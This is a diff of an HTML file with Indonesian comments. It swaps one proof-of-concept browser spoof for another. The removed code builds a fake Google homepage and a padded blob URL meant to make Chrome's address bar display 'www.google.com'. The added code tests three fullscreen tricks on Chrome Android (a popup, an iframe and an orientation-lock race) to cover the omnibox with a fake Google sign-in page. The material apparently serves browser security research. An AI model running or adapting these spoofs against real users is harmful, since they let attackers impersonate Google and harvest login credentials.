@@ -1,50 +1,45 @@
 <!DOCTYPE html>
 <html>
-<head>
-<meta charset="utf-8">
-<title>Homepage</title>
-<style>
-  body { margin:0; font-family: arial, sans-serif; }
-  .bar { padding:8px 20px; background:#f1f1f1; border-bottom:1px solid #ddd; }
-  .bar a { color:#1a0dab; text-decoration:none; font-size:13px; }
-</style>
-</head>
 <body>
-<div class="bar">
-  <!-- Replika tampilan atas halaman Google Search supaya lebih meyakinkan -->
-  <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
-  <a href="#">Gmail</a> | <a href="#">Images</a> | <a href="#">Sign in</a>
-</div>
-<div style="padding:60px 20px; text-align:center;">
-  <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google logo">
-  <br><br>
-  <input type="text" size="40" placeholder="Search Google or type a URL">
-  <br><br>
-  <button>Google Search</button>
-  <button>I'm Feeling Lucky</button>
-</div>
 <script>
-  // Langkah 1: buat blob URL dengan "padding" panjang + string google.com palsu
-  // pada posisi yang TIDAK ter-elide di address bar.
-  // Padding harus panjang sehingga bagian depan blob URL (yang berisi
-  // origin attacker) ter-elide, dan sisa terlihat adalah teks yang kita kontrol.
-  const padding = 'a'.repeat(500);
-  const fakeOrigin = '.www.google.com/search?q=';
+// Uji 3 varian fullscreen-spoof di Chrome Android:
+// apakah omnibox tetap tampil / bisa ditutupi saat fullscreen
+function testFullscreenPopup() {
+  // Varian A: fullscreen dari window.open (popup) — beberapa patch hanya
+  // menutup fullscreen dari halaman top-level
+  const w = window.open('about:blank');
+  w.document.body.innerHTML = '<h1>Google Sign in (fake)</h1>';
+  w.document.documentElement.requestFullscreen()
+    .then(() => console.log('A: fullscreen ok dari popup'))
+    .catch(e => console.log('A: blocked -', e));
+}
 
-  // Langkah 2: buat konten spoof di dalam blob agar navigasi commit ke blob
-  // dan address bar menampilkan blob URL (bukan halaman attacker asli).
-  const spoofHTML = document.documentElement.outerHTML;
-  const blob = new Blob([spoofHTML], {type: 'text/html'});
-  const blobURL = URL.createObjectURL(blob);
+function testFullscreenIframe() {
+  // Varian B: iframe meminta fullscreen (allow="fullscreen")
+  const f = document.createElement('iframe');
+  f.allow = 'fullscreen';
+  f.src = 'about:blank';
+  document.body.appendChild(f);
+  f.onload = () => {
+    f.contentWindow.document.documentElement.requestFullscreen()
+      .then(() => console.log('B: fullscreen ok dari iframe'))
+      .catch(e => console.log('B: blocked -', e));
+  };
+}
 
-  // Langkah 3: race — navigasi window.open lalu replace ke blob dengan padding.
-  const w = window.open('https://www.google.com');
-  setTimeout(() => {
-    // URL final di address bar: blob:https://attacker-domain/...<padding>www.google.com/...
-    // Chrome meng-elide host yang panjang sehingga yang terlihat di address bar
-    // adalah "...www.google.com/..." -> tampak seperti halaman Google.
-    w.location = blobURL.replace('blob:', 'blob:/' + padding + fakeOrigin + '/');
-  }, 300);
+function testOrientationRace() {
+  // Varian C: fullscreen + orientation lock + resize race
+  // — omnibox kadang tidak re-layout saat rotasi cepat
+  document.documentElement.requestFullscreen()
+    .then(() => screen.orientation.lock('landscape'))
+    .then(() => {
+      // ganti konten saat transisi rotasi
+      document.title = 'https://www.google.com — Sign in';
+      document.body.innerHTML = '<h1 style="font-family:sans-serif">Sign in with your Google Account</h1>';
+    })
+    .catch(e => console.log('C: blocked -', e));
+}
+testFullscreenPopup();
 </script>
 </body>
 </html>
